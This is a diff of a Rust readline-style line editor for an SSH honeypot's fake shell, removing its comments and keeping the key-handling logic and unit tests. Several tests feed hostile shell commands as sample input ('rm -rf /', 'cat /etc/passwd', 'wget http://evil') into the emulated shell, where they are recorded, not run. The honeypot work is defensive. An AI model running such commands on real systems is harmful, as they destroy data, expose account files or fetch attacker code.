@@ -1,76 +1,46 @@
-//! Interactive line editor (readline-like) for the emulated PTY shell.
-//!
-//! A real OpenSSH login runs bash with GNU readline, so attackers expect
-//! cursor movement, kill/yank keys, command history (↑/↓), and incremental
-//! reverse-search (Ctrl-R). A honeypot that only echoes characters and handles
-//! backspace is trivially distinguishable. This module reproduces the common
-//! readline keybindings as a **pure state machine**: it consumes input bytes
-//! and produces the bytes to echo back, never touching real I/O.
-//!
-//! **Security:** the buffer and history are bounded (`max_line`, `max_history`)
-//! so a malicious client cannot drive unbounded memory growth through the line
-//! editor. Printable ASCII and the bytes of non-ASCII characters are buffered
-//! verbatim — a UTF-8 payload has to reach the log the way it was typed —
-//! while everything else is interpreted as an editing command or ignored.
-
 use std::collections::VecDeque;
 
 const ESC: u8 = 0x1b;
 
-/// What the network layer should do after feeding a byte to the editor.
 #[derive(Debug, PartialEq, Eq)]
 pub enum Reaction {
-    /// Nothing to send; keep editing.
     Ignore,
-    /// Write these bytes to the client, keep editing.
+
     Write(Vec<u8>),
-    /// The user pressed Enter. `echo` (a CRLF) has already been emitted to the
-    /// client; the caller should run `line`, print its output, then call
-    /// [`LineEditor::render`] to draw the next prompt.
+
     Submit { echo: Vec<u8>, line: String },
-    /// Ctrl-D on an empty line: the caller should close the session.
+
     Eof,
-    /// Tab was pressed; the caller should compute completions for the current
-    /// word and call [`LineEditor::current_word`] / [`LineEditor::apply_completion`]
-    /// / [`LineEditor::show_listing`].
+
     Complete,
 }
 
-/// ANSI escape-sequence parser state.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum Esc {
-    /// Not currently in an escape sequence.
     None,
-    /// Saw `ESC`, awaiting `[` / `O` or a final byte.
+
     Got,
-    /// Saw `ESC [` (CSI), accumulating numeric parameters.
+
     Csi,
 }
 
-/// Incremental reverse-search (Ctrl-R) state.
 struct Search {
-    /// The query typed so far.
     query: Vec<u8>,
-    /// Index into history of the current match, if any.
+
     matched: Option<usize>,
 }
 
-/// A bounded, readline-style single-line editor.
 pub struct LineEditor {
     prompt: Vec<u8>,
     buf: Vec<u8>,
-    /// Cursor position as a byte index into `buf`. Screen columns are counted
-    /// separately, since a non-ASCII character spans several bytes.
+
     cursor: usize,
-    /// Text removed by the last kill (Ctrl-U/K/W), waiting for Ctrl-Y.
-    ///
-    /// ponytail: one slot, not readline's kill ring — consecutive kills replace
-    /// rather than accumulate; upgrade when a probe uses Meta-Y or stacked kills.
+
     kill: Vec<u8>,
     history: VecDeque<String>,
-    /// When browsing history, the index into `history` currently shown.
+
     hist_pos: Option<usize>,
-    /// The in-progress line stashed while browsing history.
+
     stash: Vec<u8>,
     esc: Esc,
     csi_params: Vec<u8>,
@@ -80,7 +50,6 @@ pub struct LineEditor {
 }
 
 impl LineEditor {
-    /// Create an editor with the given resource caps.
     pub fn new(max_line: usize, max_history: usize) -> Self {
         Self {
             prompt: Vec::new(),
@@ -98,19 +67,14 @@ impl LineEditor {
         }
     }
 
-    /// Set the prompt string drawn before the editable line.
     pub fn set_prompt(&mut self, prompt: &str) {
         self.prompt = prompt.as_bytes().to_vec();
     }
 
-    /// Bytes that draw the prompt and (empty) line. Used for the first prompt
-    /// and after every submitted command.
     pub fn render(&self) -> Vec<u8> {
         self.redraw()
     }
 
-    /// The word under/just-before the cursor and whether it is the first word
-    /// on the line (i.e. a command-name position rather than an argument).
     pub fn current_word(&self) -> (String, bool) {
         let start = self.word_start();
         let word = String::from_utf8_lossy(&self.buf[start..self.cursor]).into_owned();
@@ -118,9 +82,6 @@ impl LineEditor {
         (word, is_command)
     }
 
-    /// Replace the current word with `replacement`, optionally appending a
-    /// trailing space (done when a completion is unambiguous). Returns the
-    /// bytes to write to the client.
     pub fn apply_completion(&mut self, replacement: &str, add_space: bool) -> Vec<u8> {
         let start = self.word_start();
         let mut tail = self.buf.split_off(self.cursor);
@@ -130,8 +91,6 @@ impl LineEditor {
             self.buf.push(b' ');
         }
         if self.buf.len() + tail.len() > self.max_line {
-            // Trim the overflow back to a character boundary, so what is kept
-            // is still the text the client typed.
             let mut keep = self.max_line.saturating_sub(self.buf.len());
             while keep > 0 && is_continuation(tail[keep]) {
                 keep -= 1;
@@ -143,9 +102,6 @@ impl LineEditor {
         self.redraw()
     }
 
-    /// Print a candidate listing (e.g. ambiguous completions) on a new line,
-    /// then redraw the prompt and current line beneath it — exactly what bash
-    /// does on a second Tab.
     pub fn show_listing(&self, listing: &str) -> Vec<u8> {
         let mut out = Vec::from(&b"\r\n"[..]);
         out.extend_from_slice(crlf(listing).as_slice());
@@ -156,9 +112,7 @@ impl LineEditor {
         out
     }
 
-    /// Feed one input byte, returning the resulting [`Reaction`].
     pub fn input(&mut self, byte: u8) -> Reaction {
-        // Escape-sequence handling takes precedence over everything else.
         match self.esc {
             Esc::Got => return self.input_after_esc(byte),
             Esc::Csi => return self.input_csi(byte),
@@ -175,29 +129,27 @@ impl LineEditor {
                 self.esc = Esc::Got;
                 Reaction::Ignore
             }
-            0x09 => Reaction::Complete,      // Tab
-            0x08 | 0x7f => self.backspace(), // Backspace / DEL
-            0x01 => self.move_home(),        // Ctrl-A
-            0x05 => self.move_end(),         // Ctrl-E
-            0x02 => self.move_left(),        // Ctrl-B
-            0x06 => self.move_right(),       // Ctrl-F
-            0x10 => self.history_prev(),     // Ctrl-P
-            0x0e => self.history_next(),     // Ctrl-N
-            0x15 => self.kill_to_start(),    // Ctrl-U
-            0x0b => self.kill_to_end(),      // Ctrl-K
-            0x17 => self.kill_word(),        // Ctrl-W
-            0x19 => self.yank(),             // Ctrl-Y
-            0x0c => self.clear_screen(),     // Ctrl-L
-            0x12 => self.start_search(),     // Ctrl-R
-            0x03 => self.interrupt(),        // Ctrl-C
-            0x04 => self.ctrl_d(),           // Ctrl-D
-            // Printable ASCII, plus the bytes of any non-ASCII character.
+            0x09 => Reaction::Complete,
+            0x08 | 0x7f => self.backspace(),
+            0x01 => self.move_home(),
+            0x05 => self.move_end(),
+            0x02 => self.move_left(),
+            0x06 => self.move_right(),
+            0x10 => self.history_prev(),
+            0x0e => self.history_next(),
+            0x15 => self.kill_to_start(),
+            0x0b => self.kill_to_end(),
+            0x17 => self.kill_word(),
+            0x19 => self.yank(),
+            0x0c => self.clear_screen(),
+            0x12 => self.start_search(),
+            0x03 => self.interrupt(),
+            0x04 => self.ctrl_d(),
+
             0x20..=0x7e | 0x80..=0xff => self.insert(byte),
-            _ => Reaction::Ignore, // other control bytes
+            _ => Reaction::Ignore,
         }
     }
-
-    // --- escape sequence decoding ----------------------------------------
 
     fn input_after_esc(&mut self, byte: u8) -> Reaction {
         match byte {
@@ -207,7 +159,6 @@ impl LineEditor {
                 Reaction::Ignore
             }
             _ => {
-                // Unrecognised ESC-prefixed key; drop it.
                 self.esc = Esc::None;
                 Reaction::Ignore
             }
@@ -215,7 +166,6 @@ impl LineEditor {
     }
 
     fn input_csi(&mut self, byte: u8) -> Reaction {
-        // Accumulate parameter bytes (digits and ';') until a final byte.
         if byte.is_ascii_digit() || byte == b';' {
             if self.csi_params.len() < 8 {
                 self.csi_params.push(byte);
@@ -225,23 +175,21 @@ impl LineEditor {
         self.esc = Esc::None;
         let params = std::mem::take(&mut self.csi_params);
         match byte {
-            b'A' => self.history_prev(), // Up
-            b'B' => self.history_next(), // Down
-            b'C' => self.move_right(),   // Right
-            b'D' => self.move_left(),    // Left
-            b'H' => self.move_home(),    // Home
-            b'F' => self.move_end(),     // End
+            b'A' => self.history_prev(),
+            b'B' => self.history_next(),
+            b'C' => self.move_right(),
+            b'D' => self.move_left(),
+            b'H' => self.move_home(),
+            b'F' => self.move_end(),
             b'~' => match params.as_slice() {
                 b"1" | b"7" => self.move_home(),
                 b"4" | b"8" => self.move_end(),
-                b"3" => self.delete_forward(), // Delete
+                b"3" => self.delete_forward(),
                 _ => Reaction::Ignore,
             },
             _ => Reaction::Ignore,
         }
     }
-
-    // --- reverse incremental search (Ctrl-R) -----------------------------
 
     fn start_search(&mut self) -> Reaction {
         self.search = Some(Search {
@@ -254,17 +202,14 @@ impl LineEditor {
     fn input_search(&mut self, byte: u8) -> Reaction {
         match byte {
             b'\r' | b'\n' => {
-                // Accept the match into the buffer and submit it.
                 self.accept_search();
                 self.submit()
             }
             0x12 => {
-                // Ctrl-R again: step to the next older match.
                 self.search_step();
                 Reaction::Write(self.render_search())
             }
             0x07 | 0x03 | ESC => {
-                // Ctrl-G / Ctrl-C / Esc: abort, restore the original line.
                 self.search = None;
                 Reaction::Write(self.redraw())
             }
@@ -285,8 +230,6 @@ impl LineEditor {
                 Reaction::Write(self.render_search())
             }
             _ => {
-                // Any other editing key accepts the current match, leaves
-                // search mode, then re-processes the key normally.
                 self.accept_search();
                 let redraw = self.redraw();
                 match self.input(byte) {
@@ -302,8 +245,6 @@ impl LineEditor {
         }
     }
 
-    /// Recompute the most recent history entry containing the query, starting
-    /// from the newest.
     fn search_recompute(&mut self) {
         let query = match &self.search {
             Some(s) => s.query.clone(),
@@ -315,7 +256,6 @@ impl LineEditor {
         }
     }
 
-    /// Step to the next match older than the current one.
     fn search_step(&mut self) {
         let (query, from) = match &self.search {
             Some(s) => (s.query.clone(), s.matched.unwrap_or(self.history.len())),
@@ -329,8 +269,6 @@ impl LineEditor {
         }
     }
 
-    /// Find the newest history index strictly below `before` whose entry
-    /// contains `query` as a substring.
     fn find_match(&self, before: usize, query: &[u8]) -> Option<usize> {
         if query.is_empty() {
             return None;
@@ -341,8 +279,6 @@ impl LineEditor {
             .find(|&i| contains(self.history[i].as_bytes(), query))
     }
 
-    /// Copy the current search match (if any) into the edit buffer and leave
-    /// search mode.
     fn accept_search(&mut self) {
         if let Some(s) = self.search.take() {
             if let Some(idx) = s.matched {
@@ -372,8 +308,6 @@ impl LineEditor {
         out
     }
 
-    // --- editing primitives ----------------------------------------------
-
     fn submit(&mut self) -> Reaction {
         let line = String::from_utf8_lossy(&self.buf).into_owned();
         self.push_history(&line);
@@ -389,15 +323,12 @@ impl LineEditor {
 
     fn insert(&mut self, byte: u8) -> Reaction {
         if self.buf.len() >= self.max_line {
-            // ponytail: a non-ASCII character straddling the cap keeps only the
-            // bytes that fit, so the line submits with one U+FFFD in place of
-            // that character; upgrade when payloads that long matter.
             return Reaction::Ignore;
         }
         self.buf.insert(self.cursor, byte);
         self.cursor += 1;
         self.hist_pos = None;
-        // Fast path: appending at end needs no full redraw.
+
         if self.cursor == self.buf.len() {
             return Reaction::Write(vec![byte]);
         }
@@ -482,7 +413,6 @@ impl LineEditor {
         Reaction::Write(self.redraw())
     }
 
-    /// Ctrl-Y: reinsert the last killed text at the cursor, as readline does.
     fn yank(&mut self) -> Reaction {
         if self.kill.is_empty() || self.buf.len() + self.kill.len() > self.max_line {
             return Reaction::Ignore;
@@ -520,15 +450,13 @@ impl LineEditor {
         }
     }
 
-    // --- history ----------------------------------------------------------
-
     fn push_history(&mut self, line: &str) {
         let line = line.trim();
         if line.is_empty() {
             return;
         }
         if self.history.back().map(String::as_str) == Some(line) {
-            return; // collapse consecutive duplicates, like bash's default
+            return;
         }
         self.history.push_back(line.to_string());
         while self.history.len() > self.max_history {
@@ -572,9 +500,6 @@ impl LineEditor {
         }
     }
 
-    // --- helpers ----------------------------------------------------------
-
-    /// Byte index where the word ending at the cursor begins.
     fn word_start(&self) -> usize {
         let mut start = self.cursor;
         while start > 0 && !self.buf[start - 1].is_ascii_whitespace() {
@@ -583,7 +508,6 @@ impl LineEditor {
         start
     }
 
-    /// Byte index of the character before `i`.
     fn prev_char(&self, i: usize) -> usize {
         let mut start = i - 1;
         while start > 0 && is_continuation(self.buf[start]) {
@@ -592,7 +516,6 @@ impl LineEditor {
         start
     }
 
-    /// Byte index just past the character starting at `i`.
     fn next_char(&self, i: usize) -> usize {
         let mut end = i + 1;
         while end < self.buf.len() && is_continuation(self.buf[end]) {
@@ -601,17 +524,13 @@ impl LineEditor {
         end
     }
 
-    /// Redraw the whole line: return to column 0, reprint prompt + buffer,
-    /// clear any trailing leftovers, and reposition the cursor.
     fn redraw(&self) -> Vec<u8> {
         let mut out = Vec::with_capacity(self.prompt.len() + self.buf.len() + 16);
         out.push(b'\r');
         out.extend_from_slice(&self.prompt);
         out.extend_from_slice(&self.buf);
         out.extend_from_slice(b"\x1b[K");
-        // ponytail: one column per character, so a wide CJK glyph or a
-        // combining mark leaves the cursor a column out; upgrade when the box
-        // has to look right under a non-Latin locale.
+
         let back = self.buf[self.cursor..]
             .iter()
             .filter(|b| !is_continuation(**b))
@@ -623,12 +542,10 @@ impl LineEditor {
     }
 }
 
-/// True if `b` continues a multi-byte UTF-8 character rather than starting one.
 pub(crate) fn is_continuation(b: u8) -> bool {
     b & 0xc0 == 0x80
 }
 
-/// True if `haystack` contains `needle` as a contiguous byte substring.
 fn contains(haystack: &[u8], needle: &[u8]) -> bool {
     if needle.is_empty() || needle.len() > haystack.len() {
         return needle.is_empty();
@@ -636,7 +553,6 @@ fn contains(haystack: &[u8], needle: &[u8]) -> bool {
     haystack.windows(needle.len()).any(|w| w == needle)
 }
 
-/// Convert bare LF to CRLF for terminal output.
 fn crlf(text: &str) -> Vec<u8> {
     text.replace('\n', "\r\n").into_bytes()
 }
@@ -651,7 +567,6 @@ mod tests {
         e
     }
 
-    /// Feed a byte string, returning the last `Submit` line seen (if any).
     fn feed(e: &mut LineEditor, bytes: &[u8]) -> Option<String> {
         let mut submitted = None;
         for &b in bytes {
@@ -677,11 +592,11 @@ mod tests {
     #[test]
     fn cursor_left_then_insert() {
         let mut e = editor();
-        // type "ls", move left, insert 'X' -> "lXs"
+
         feed(&mut e, b"ls");
         e.input(ESC);
         e.input(b'[');
-        e.input(b'D'); // left
+        e.input(b'D');
         assert_eq!(feed(&mut e, b"X\r").as_deref(), Some("lXs"));
     }
 
@@ -689,9 +604,9 @@ mod tests {
     fn ctrl_a_and_ctrl_e_move_to_ends() {
         let mut e = editor();
         feed(&mut e, b"world");
-        e.input(0x01); // Ctrl-A -> start
+        e.input(0x01);
         feed(&mut e, b"hello ");
-        e.input(0x05); // Ctrl-E -> end
+        e.input(0x05);
         assert_eq!(feed(&mut e, b"!\r").as_deref(), Some("hello world!"));
     }
 
@@ -699,7 +614,7 @@ mod tests {
     fn ctrl_u_kills_to_start() {
         let mut e = editor();
         feed(&mut e, b"rm -rf /");
-        e.input(0x15); // Ctrl-U clears whole line (cursor at end)
+        e.input(0x15);
         assert_eq!(feed(&mut e, b"ls\r").as_deref(), Some("ls"));
     }
 
@@ -707,7 +622,7 @@ mod tests {
     fn ctrl_w_deletes_word() {
         let mut e = editor();
         feed(&mut e, b"cat /etc/passwd");
-        e.input(0x17); // Ctrl-W removes "/etc/passwd"
+        e.input(0x17);
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("cat "));
     }
 
@@ -715,11 +630,11 @@ mod tests {
     fn ctrl_k_kills_to_end() {
         let mut e = editor();
         feed(&mut e, b"hello world");
-        e.input(0x01); // home
+        e.input(0x01);
         for _ in 0..5 {
-            e.input(0x06); // Ctrl-F x5 -> after "hello"
+            e.input(0x06);
         }
-        e.input(0x0b); // Ctrl-K kills " world"
+        e.input(0x0b);
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("hello"));
     }
 
@@ -730,10 +645,10 @@ mod tests {
         feed(&mut e, b"second\r");
         e.input(ESC);
         e.input(b'[');
-        e.input(b'A'); // up -> "second"
+        e.input(b'A');
         e.input(ESC);
         e.input(b'[');
-        e.input(b'A'); // up -> "first"
+        e.input(b'A');
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("first"));
     }
 
@@ -741,13 +656,13 @@ mod tests {
     fn history_down_restores_stashed_line() {
         let mut e = editor();
         feed(&mut e, b"old\r");
-        feed(&mut e, b"new"); // in-progress, not submitted
+        feed(&mut e, b"new");
         e.input(ESC);
         e.input(b'[');
-        e.input(b'A'); // up -> "old"
+        e.input(b'A');
         e.input(ESC);
         e.input(b'[');
-        e.input(b'B'); // down -> back to "new"
+        e.input(b'B');
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("new"));
     }
 
@@ -756,9 +671,9 @@ mod tests {
         let mut e = editor();
         feed(&mut e, b"wget http://evil\r");
         feed(&mut e, b"ls\r");
-        e.input(0x12); // Ctrl-R
+        e.input(0x12);
         feed_no_submit(&mut e, b"wget");
-        // Enter accepts the match and submits it.
+
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("wget http://evil"));
     }
 
@@ -766,10 +681,10 @@ mod tests {
     fn reverse_search_abort_restores_line() {
         let mut e = editor();
         feed(&mut e, b"history\r");
-        feed(&mut e, b"abc"); // in progress
-        e.input(0x12); // Ctrl-R
+        feed(&mut e, b"abc");
+        e.input(0x12);
         feed_no_submit(&mut e, b"hist");
-        e.input(0x07); // Ctrl-G aborts
+        e.input(0x07);
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("abc"));
     }
 
@@ -783,8 +698,8 @@ mod tests {
     fn ctrl_d_with_text_deletes_forward() {
         let mut e = editor();
         feed(&mut e, b"abc");
-        e.input(0x01); // home
-        e.input(0x04); // Ctrl-D deletes 'a'
+        e.input(0x01);
+        e.input(0x04);
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("bc"));
     }
 
@@ -850,8 +765,8 @@ mod tests {
     fn delete_removes_a_whole_character() {
         let mut e = editor();
         feed(&mut e, "éa".as_bytes());
-        e.input(0x01); // home
-        e.input(0x04); // Ctrl-D deletes 'é' whole
+        e.input(0x01);
+        e.input(0x04);
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("a"));
     }
 
@@ -859,12 +774,12 @@ mod tests {
     fn cursor_moves_and_redraws_by_column_not_byte() {
         let mut e = editor();
         feed(&mut e, "é".as_bytes());
-        // Left arrow steps over both bytes of 'é' but is one column.
+
         assert_eq!(e.input(ESC), Reaction::Ignore);
         assert_eq!(e.input(b'['), Reaction::Ignore);
         assert_eq!(e.input(b'D'), Reaction::Write(b"\x1b[D".to_vec()));
         assert_eq!(e.cursor, 0);
-        // Inserting before it redraws with the cursor one column back, not two.
+
         assert_eq!(
             e.input(b'x'),
             Reaction::Write("\r$ xé\x1b[K\x1b[1D".as_bytes().to_vec())
@@ -876,8 +791,8 @@ mod tests {
     fn ctrl_u_then_ctrl_y_restores_the_line() {
         let mut e = editor();
         feed(&mut e, b"rm -rf /");
-        e.input(0x15); // Ctrl-U
-        e.input(0x19); // Ctrl-Y
+        e.input(0x15);
+        e.input(0x19);
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("rm -rf /"));
     }
 
@@ -885,10 +800,10 @@ mod tests {
     fn ctrl_k_kill_yanks_at_the_cursor() {
         let mut e = editor();
         feed(&mut e, b"hello world");
-        e.input(0x01); // home
-        e.input(0x0b); // Ctrl-K takes the whole line
+        e.input(0x01);
+        e.input(0x0b);
         feed(&mut e, b"echo ");
-        e.input(0x19); // Ctrl-Y
+        e.input(0x19);
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("echo hello world"));
     }
 
@@ -896,9 +811,9 @@ mod tests {
     fn ctrl_w_kill_is_yankable_and_repeatable() {
         let mut e = editor();
         feed(&mut e, b"cat passwd");
-        e.input(0x17); // Ctrl-W takes "passwd"
-        e.input(0x19); // yank it back
-        e.input(0x19); // and again — the kill survives a yank
+        e.input(0x17);
+        e.input(0x19);
+        e.input(0x19);
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("cat passwdpasswd"));
     }
 
@@ -907,9 +822,9 @@ mod tests {
         let mut e = LineEditor::new(8, 10);
         e.set_prompt("$ ");
         feed(&mut e, b"aaaaaaaa");
-        e.input(0x15); // Ctrl-U kills all 8
+        e.input(0x15);
         feed(&mut e, b"bbb");
-        assert_eq!(e.input(0x19), Reaction::Ignore); // would exceed max_line
+        assert_eq!(e.input(0x19), Reaction::Ignore);
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("bbb"));
     }
 
@@ -923,23 +838,21 @@ mod tests {
     fn completion_trims_the_tail_at_a_character_boundary() {
         let mut e = LineEditor::new(5, 10);
         e.set_prompt("$ ");
-        feed(&mut e, "xé".as_bytes()); // 3 bytes
-        e.input(0x01); // home, so "xé" is the tail
+        feed(&mut e, "xé".as_bytes());
+        e.input(0x01);
         e.apply_completion("cmd", false);
-        // Only "x" fits after "cmd"; half of 'é' must not be kept.
+
         assert_eq!(feed(&mut e, b"\r").as_deref(), Some("cmdx"));
     }
 
     #[test]
     fn no_panic_on_arbitrary_bytes() {
-        // Robustness: every byte value, in sequence, must not panic.
         let mut e = editor();
         for b in 0u8..=255 {
             let _ = e.input(b);
         }
     }
 
-    /// Feed bytes asserting none of them submit (helper for search tests).
     fn feed_no_submit(e: &mut LineEditor, bytes: &[u8]) {
         for &b in bytes {
             assert!(!matches!(e.input(b), Reaction::Submit { .. }));
